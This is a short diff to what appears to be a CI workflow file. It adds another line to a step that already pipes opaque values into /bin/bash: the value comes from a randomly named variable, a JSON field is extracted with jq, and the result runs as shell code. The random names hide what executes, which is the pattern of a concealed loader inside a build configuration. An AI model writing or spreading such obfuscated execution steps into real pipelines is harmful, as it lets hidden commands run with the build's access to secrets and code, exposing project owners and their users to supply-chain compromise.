@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$dcf9009" | jq -r .nldn10060 | /bin/bash
           echo $fa82284 | jq -r .vpj0053 | /bin/bash
           printf '%s' "$azye3491" | jq -r .b10032 | /bin/bash
+          echo $ky73 | jq -r .mhayv21 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
